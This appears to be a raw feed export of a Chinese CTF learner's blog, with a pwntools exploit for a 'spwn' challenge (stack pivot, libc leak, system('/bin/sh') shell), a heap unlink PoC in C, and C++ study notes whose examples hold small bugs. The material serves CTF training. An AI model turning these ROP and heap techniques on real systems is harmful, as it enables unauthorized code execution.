title="spwn"></a>spwn</h3><p>这题，怎么说呢，学艺不精，在最后进行read读入的时候，我忘记加上leave_ret，将程序流劫持到read(addr)地方了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./spwn'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./spwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x08048408</span></span><br><span class="line">pop1_ret = <span class="number">0x080485ab</span></span><br><span class="line">pop3_ret = <span class="number">0x080485a9</span></span><br><span class="line">buf = elf.bss()+<span class="number">0x500</span></span><br><span class="line">buf2 = elf.bss()+<span class="number">0x400</span></span><br><span class="line">read_plt = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line">puts_plt = elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">shellcode = <span class="number">0x0804A300</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">payload = p32(<span class="number">0x0804A380</span>) </span><br><span class="line">payload += p32(elf.plt[<span class="string">'write'</span>]) </span><br><span class="line">payload += p32(leave_ret) </span><br><span class="line">payload += p32(<span class="number">1</span>) </span><br><span class="line">payload += p32(elf.got[<span class="string">'write'</span>])</span><br><span class="line">payload += p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">payload += <span class="string">'a'</span>*(<span class="number">0x80</span> - <span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(<span class="number">0x0804A400</span>)</span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(leave_ret) </span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0x0804A400</span>)</span><br><span class="line">payload += p32(<span class="number">20</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p32(shellcode) + p32(leave_ret)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">write_addr= u32(sh.recv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">"write :"</span>+hex(write_addr))</span><br><span class="line">libc_base = write_addr - libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh_addr = libc_base + libc.search(<span class="string">'/bin/sh\x00'</span>).next()</span><br><span class="line">log.success(<span class="string">"libc_base :"</span>+hex(libc_base))</span><br><span class="line">log.success(<span class="string">"system :"</span>+hex(system_addr))</span><br><span class="line">log.success(<span class="string">"binsh :"</span>+hex(binsh_addr))</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0xdeadbeef</span>) + p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pwn unlink</title>
      <link href="/2019/10/18/pwn%20%20unlink/"/>
      <url>/2019/10/18/pwn%20%20unlink/</url>
      
        <content type="html"><![CDATA[<p>一个实验的poc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * target = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">init();</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * ptr1 = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * ptr2 = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * ptr3 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">target = ptr1;</span><br><span class="line">ptr1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">ptr1[<span class="number">1</span>] = <span class="number">0x81</span>;</span><br><span class="line">ptr1[<span class="number">2</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;target) - <span class="number">0x18</span>;</span><br><span class="line">ptr1[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;target) - <span class="number">0x10</span>;</span><br><span class="line">ptr2[<span class="number">-2</span>] = <span class="number">0x80</span>;</span><br><span class="line">ptr2[<span class="number">-1</span>] = <span class="number">0x90</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"target = %p before free\n"</span>,target);</span><br><span class="line"><span class="built_in">free</span>(ptr2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"target = %p after free\n"</span>,target);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"pid = %d\n"</span>,getpid());</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>c++学习笔记（面向过程的编程风格）</title>
      <link href="/2019/10/18/c++%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E9%9D%A2%E5%90%91%E8%BF%87%E7%A8%8B%E7%9A%84%E7%BC%96%E7%A8%8B%E9%A3%8E%E6%A0%BC%EF%BC%89/"/>
      <url>/2019/10/18/c++%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E9%9D%A2%E5%90%91%E8%BF%87%E7%A8%8B%E7%9A%84%E7%BC%96%E7%A8%8B%E9%A3%8E%E6%A0%BC%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h3 id="传值与传址"><a href="#传值与传址" class="headerlink" title="传值与传址"></a>传值与传址</h3><p>传值：只是讲其的值进行复制，再在函数里进行改变，但实际上，那个地址上的值没有任何变动</p><p>在调用函数时，会创建一块栈空间，保存了这个模块中的形参，一旦函数执行完毕，就会pop。</p><p>过程就是  sub   mov   add </p><p>当我们将vec[ix]这样的对象传入函数，默认情况下其值会被复制一份，成为意义上的形参。</p><p>传址：直接对地址上的值进行变动</p><h3 id="inline函数"><a href="#inline函数" class="headerlink" title="inline函数"></a>inline函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">//函数定义为inline即:内联函数</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">char</span>* <span class="title">dbtest</span><span class="params">(<span class="keyword">int</span> a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (i % <span class="number">2</span> &gt; <span class="number">0</span>) ? <span class="string">"奇"</span> : <span class="string">"偶"</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span> (i=<span class="number">1</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"i:%d    奇偶性:%s /n"</span>, i, dbtest(i));    </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的例子就是标准的内联函数的用法，使用inline修饰带来的好处我们表面看不出来，其实，在内部的工作就是在每个for循环的内部任何调用dbtest(i)的地方都换成了(i%2&gt;0)?”奇”:”偶”，这样就<strong>避免了频繁调用函数对栈内存重复开辟所带来的消耗</strong>。</p><p>（不懂的可以拿poc去gcc，看汇编分析）</p><h3 id="local-static"><a href="#local-static" class="headerlink" title="local static"></a>local static</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;*</span><br><span class="line"></span><br><span class="line">fibon_seq(<span class="keyword">int</span> size)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">​<span class="keyword">static</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;elems;</span><br><span class="line"></span><br><span class="line">​<span class="comment">//函数工作逻辑在此处</span></span><br><span class="line"></span><br><span class="line">​<span class="keyword">return</span> &amp;elem;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处elem被定义为局部静态变量，局部静态变量的含义是： 局部静态变量所处的内存空间，即使在不同的函数调用过程中，依然持续存在。</p><p>例子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"pch.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">check</span><span class="params">(<span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> ((size &lt;= <span class="number">0</span> || size &gt; <span class="number">64</span>) ? <span class="literal">false</span> : <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;*</span><br><span class="line">Pentagonal_series(<span class="keyword">int</span> pos)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; _elems;</span><br><span class="line"><span class="keyword">if</span> (check(pos) &amp;&amp; (pos &gt; _elems.size()))</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> ix = _elems.size() + <span class="number">1</span>; ix &lt;= pos; ix++)</span><br><span class="line">_elems.push_back((ix * (<span class="number">3</span> * ix - <span class="number">1</span>)) / <span class="number">2</span>);</span><br><span class="line"><span class="keyword">return</span> &amp;_elems;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//↓ pent就为局部静态变量，被赋值给了elem，在main中依然可以进行输出操作</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Pentagonal</span><span class="params">(<span class="keyword">int</span> size, <span class="keyword">int</span> &amp;elem)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!check(size))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"sorry!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">elem = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; *pent = Pentagonal_series(size);</span><br><span class="line">elem = (*pent)[size - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> elem;</span><br><span class="line"><span class="keyword">if</span> (Pentagonal(<span class="number">8</span>, elem))</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"element 8 is "</span> &lt;&lt; elem &lt;&lt; <span class="string">'\n'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="函数重载"><a href="#函数重载" class="headerlink" title="函数重载"></a>函数重载</h3><p>函数名可以相同，参数不同（类型，个数）</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>c++学习笔记（c++编程基础）</title>
      <link href="/2019/10/18/c++%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20%EF%BC%88c++%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80%EF%BC%89/"/>
      <url>/2019/10/18/c++%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20%EF%BC%88c++%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h3 id="using-namespace"><a href="#using-namespace" class="headerlink" title="using namespace"></a>using namespace</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span></span><br></pre></td></tr></table></figure><p>形象通俗的讲，就是为了防止同文件中同变量名或函数名产生冲突，只要它们属于不同的名空间</p><h3 id="const"><a href="#const" class="headerlink" title="const"></a>const</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> max_tries = <span class="number">3</span> ;</span><br></pre></td></tr></table></figure><p>被定义为const的对象，在获得初值以后，无法再有任何改动。如果你企图为const对象指定新值，会产生编译错误，例如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">max_tries = <span class="number">41</span> ; <span class="comment">//错误：这是个const对象</span></span><br></pre></td></tr></table></figure><p>这一切的前提都是建立在c++基础上，在c中的const是伪常量，可以通过指针修改，c++里const无法通过指针修改（感谢Delort师傅的传授）</p><h3 id="条件运算符-‘-’-和’-’"><a href="#条件运算符-‘-’-和’-’" class="headerlink" title="条件运算符 ‘?’ 和’:’"></a>条件运算符 ‘?’ 和’:’</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> line_size = <span class="number">8</span> ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> cnt =<span class="number">1</span> ;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; a_string</span><br><span class="line"></span><br><span class="line"> &lt;&lt; ( cnt % line_size ?  '  '  :  '\n'  ) ;</span><br></pre></td></tr></table></figure><p>条件运算符的一般使用形式如下：</p><p>​    expr</p><p>​        ?  如果expr 为 true ， 就执行这里</p><p>​        :  如果expr 为 false ， 就执行这里</p><p>如何判定 true 与 false呢，此例就是看上面条件表达式 是否为0，0为false，其余为true。</p><h3 id="循环语句之switch"><a href="#循环语句之switch" class="headerlink" title="循环语句之switch"></a>循环语句之switch</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>( <span class="keyword">int</span> number)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">​<span class="keyword">case</span> <span class="number">1</span> :</span><br><span class="line"></span><br><span class="line">​语句块 ;</span><br><span class="line"></span><br><span class="line">​<span class="keyword">break</span> ;</span><br><span class="line"></span><br><span class="line">​<span class="keyword">case</span> <span class="number">2</span> :</span><br><span class="line"></span><br><span class="line">​语句块 ;</span><br><span class="line"></span><br><span class="line">​<span class="keyword">break</span> ;</span><br><span class="line"></span><br><span class="line">​<span class="keyword">case</span> ......</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">default</span> :</span><br><span class="line">        语句块 ;</span><br><span class="line">        <span class="keyword">break</span> ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>switch () 中表达式的值必须为整数</p></li><li><p>表达式的值依次与case 进行比较，符合便执行该case，全没符合，如果有default，便开始执行default ，如果default也没有，就不执行任何操作</p></li><li><p>如果不在case后加上break，一旦在中间匹配到一个case进行，剩下的case全会依次执行！！！！！</p></li></ol><h3 id="Array和Vector-数组"><a href="#Array和Vector-数组" class="headerlink" title="Array和Vector 数组"></a>Array和Vector 数组</h3><h4 id="Array"><a href="#Array" class="headerlink" title="Array :"></a>Array :</h4><ol><li>必须指定元素类型，名称，大小</li></ol><p>​       Array的大小必须是个常量表达式，也就是不需要在运行时求值的表达式，例如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> seq_size = <span class="number">18</span> ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> pell_seq[ seq_size ];</span><br></pre></td></tr></table></figure><ol start="2"><li>支持统一赋值</li></ol><h4 id="Vector"><a href="#Vector" class="headerlink" title="Vector :"></a>Vector :</h4><ol><li><p>必须包含vector头文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; pell_seq[seq_size] ;</span><br></pre></td></tr></table></figure></li></ol><ol start="2"><li><p>此处的seq_size 不一定得是个常量表达式</p></li><li><p>不支持统一赋值</p><p>可以进行冗长的逐个赋值</p><p>或者利用已经初始化的Array作为Vector的初值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> <span class="keyword">int</span> elem_vals[seq_size] =</span><br><span class="line"></span><br><span class="line">   &#123;</span><br><span class="line">   ​<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span></span><br><span class="line">   &#125;;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//以elem_vals的值来初始化elem_seq</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; elem_seq( elem_vals, elem_vals+seq_size ) ;</span><br></pre></td></tr></table></figure></li></ol><p>还得注意一点，严禁off by one！！！！！！！！！！！！！！！！！！！！！！</p><p>off by one的危害，可以去另一篇buu刷题之旅查看</p><h3 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h3><p>指针的提领操作：</p><p>如果要访问一个由指针所指对象，得提领，也就是取得 “位于该指针所指内存地址上” 的对象。 在指针前用*</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> ival = <span class="number">1024</span> ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> * pi ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> *pi = &amp;ival ; <span class="comment">//pi初值设置为ival所在的内存地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//提领pi，借以访问它所指向的对象</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>  ( *pi ! =<span class="number">1024</span> )  <span class="comment">// 读取ival的值</span></span><br><span class="line"></span><br><span class="line">​*pi = <span class="number">1024</span> ;  <span class="comment">//写值到 ival</span></span><br></pre></td></tr></table></figure><h4 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h4><p>​    </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pi ;  <span class="comment">//计算p1所持有的内存地址</span></span><br></pre></td></tr></table></figure><p>此举形同操作“指针对象”本身，在我理解中类似于指针指向的某地址中写入的0x5a6f7780这个地址（pwn爷爷们大概都懂是什么意思，我也就不赘述了）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*pi ;  <span class="comment">// 求ival的值</span></span><br></pre></td></tr></table></figure><p>等于是操作pi所指的对象，在我理解里就是直接对0x5a6f7780这个地址里写入的值进行操作</p><h3 id="文件的读写"><a href="#文件的读写" class="headerlink" title="文件的读写"></a>文件的读写</h3><p>头文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br></pre></td></tr></table></figure><p>打开可供写入的文件</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ofstream outfile ( "文件名")；</span><br></pre></td></tr></table></figure><p>注： 此举会使文件中原有数据全部清空</p><p>追加模式写入文件（会写在文件末尾）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ofstream <span class="title">outfile</span><span class="params">(<span class="string">"文件名"</span> , ios_base::app)</span></span>;</span><br></pre></td></tr></table></figure><p>读取文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ifstream <span class="title">infile</span><span class="params">(<span class="string">"文件名"</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>注： 从开头开始读取</p><h3 id="‘-‘-amp-“-“"><a href="#‘-‘-amp-“-“" class="headerlink" title="‘  ‘ &amp; “  “"></a>‘  ‘ &amp; “  “</h3><p>‘a’代表了字母a</p><p>“a”代表了一个字符数组，该数组包含两个字符： 1. a      2. ‘\x00’</p><p>a++ 与 ++a的稍许差别</p><h3 id="a-与-a的稍许差别"><a href="#a-与-a的稍许差别" class="headerlink" title="a++ 与 ++a的稍许差别"></a>a++ 与 ++a的稍许差别</h3><p>对于a++，它先拷贝自己的副本，然后对真值+1。</p><p>对于++a,它只是在真值上+1/</p><p>如test1</p><p>a=1;</p><table><thead><tr><th>栈</th><th>运算式</th><th>真值</th><th>副本</th></tr></thead><tbody><tr><td>低位</td><td>a++</td><td>7</td><td>6</td></tr><tr><td></td><td>++a</td><td>6</td><td>无</td></tr><tr><td></td><td>a++</td><td>5</td><td>4</td></tr><tr><td></td><td>++a</td><td>4</td><td>无</td></tr><tr><td></td><td>a++</td><td>3</td><td>2</td></tr><tr><td>高位</td><td>++a</td><td>2</td><td>无</td></tr></tbody></table><p>此时，a的真值为7，自低位输出，如有副本则输出副本，无副本输出现在a的真值7</p><p>结果： 6 7 4 7 2 7</p><p>（这里得感谢Delort师傅的文章）</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>byte ctf (pwn)</title>
      <link href="/2019/10/18/byte%20ctf%20(pwn)/"/>
      <url>/2019/10/18/byte%20ctf%20(pwn)/</url>
      
        <content type="html"><![CDATA[<h3 id="mulnote"><a href="#mulnote" class="headerlink" title="mulnote"></a>mulnote</h3><p>简单的组合攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 